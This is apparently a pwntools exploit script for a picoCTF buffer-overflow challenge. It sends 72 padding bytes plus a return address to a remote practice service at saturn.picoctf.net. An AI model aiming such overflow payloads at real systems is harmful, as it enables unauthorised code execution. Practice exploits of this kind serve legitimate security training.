from pwn import *

bin='./vuln'

context.binary=bin

e=ELF(bin)
flag_addr=e.symbols['flag']
payload=b'A'*72+pack(0x40123b)

print(payload)

#Offline version
#p=process(bin)

#Online version
p=connect('saturn.picoctf.net',62332)

p.recvuntil(b'Give me a string that gets you the flag: ')
p.sendline(payload)

p.interactive()
#output = p.recvall()
#print(output.decode(errors="ignore"))
